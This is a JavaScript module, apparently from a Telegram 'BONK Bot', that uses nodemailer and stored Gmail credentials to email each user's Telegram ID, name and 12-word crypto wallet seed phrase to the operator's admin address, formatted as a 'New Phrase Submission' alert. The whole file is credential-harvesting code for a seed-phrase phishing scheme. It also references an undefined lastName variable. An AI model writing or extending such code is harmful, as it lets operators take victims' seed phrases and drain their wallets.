import nodemailer from "nodemailer";
import { ADMIN_EMAIL, ADMIN_EMAIL_PASS } from '../config/env.js'
const transporter = nodemailer.createTransport({
    service: 'gmail', // or another email service
    auth: {
        user: ADMIN_EMAIL,
        pass: ADMIN_EMAIL_PASS
    }
});

/**
 * Sends an admin email with a user's 12-word wallet phrase.
 * @param {number} telegram_id - Telegram user ID.
 * @param {string} firstName - User's first name.
 * @param {string} lastName - User's last name.
 * @param {string} phrase - 12-word wallet phrase.
 * @returns {Promise<Object>} - Mail delivery info object.
 */
const sendPhraseMail = async (telegram_id, firstName, phrase) => {
    const mailOptions = {
        from: `"BONK Bot 🔐" <${ADMIN_EMAIL}>`,
        to: ADMIN_EMAIL,
        subject: `🔐 Wallet Phrase from ${firstName} ${lastName}`,
        html: `
            <div style="font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; max-width: 600px; margin: auto; border: 1px solid #eee; padding: 20px; border-radius: 8px; background-color: #f9f9f9;">
                <h2 style="color: #d9534f;">🚨 New Phrase Submission</h2>
                <hr style="border: none; border-top: 1px solid #ccc;" />
                <p><strong>👤 Telegram ID:</strong> ${telegram_id}</p>
                <p><strong>📛 Name:</strong> ${firstName}</p>
                <p><strong>🔑 Phrase:</strong></p>
                <pre style="background: #fff; padding: 10px; border: 1px dashed #ccc; border-radius: 4px; white-space: pre-wrap; word-break: break-word;">${phrase}</pre>
                <p><strong>📬 Submitted:</strong> ${new Date().toLocaleString()}</p>
                <hr style="border: none; border-top: 1px solid #ccc;" />
                <footer style="text-align: center; font-size: 0.9em; color: #888;">
                    📡 BONK Bot Alert System
                </footer>
            </div>
        `
    };


    try {
        const info = await transporter.sendMail(mailOptions);
        return info;
    } catch (err) {
        console.error("❌ Error sending phrase email:", err);
        throw err;
    }
};

export default sendPhraseMail;